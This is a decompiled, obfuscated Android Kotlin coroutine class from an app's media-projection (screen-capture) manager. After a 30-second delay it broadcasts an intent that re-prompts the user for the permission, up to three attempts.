package com.storm.safe.rock.manager;

import android.content.Intent;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.SmartMediaProjectionManager$scheduleUserPromptedRecovery$1", m214403f = "SmartMediaProjectionManager.kt", m214404l = {361}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class SmartMediaProjectionManager$scheduleUserPromptedRecovery$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52055a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0262a4 f52056a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public SmartMediaProjectionManager$scheduleUserPromptedRecovery$1(C0262a4 c0262a4, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52056a2 = c0262a4;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new SmartMediaProjectionManager$scheduleUserPromptedRecovery$1(this.f52056a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((SmartMediaProjectionManager$scheduleUserPromptedRecovery$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52055a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                this.f52055a1 = 1;
                if (b81.m210571b1(30000L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
            }
            this.f52056a2.f52135a6.incrementAndGet();
            this.f52056a2.f52136a7 = System.currentTimeMillis();
            Intent intent = new Intent("com.storm.safe.rock.intent.SMART_PERMISSION_RECOVERY");
            C0262a4 c0262a4 = this.f52056a2;
            intent.putExtra("recovery_type", "user_prompted");
            intent.putExtra("attempt", c0262a4.f52135a6.get());
            intent.putExtra("max_attempts", 3);
            this.f52056a2.f52129a0.sendBroadcast(intent);
        } catch (Exception e) {
            t60.m214705c6("SmartMediaProjection", "❌ 用户提示恢复失败", e);
        }
        return C1351vv.f60710b1;
    }
}
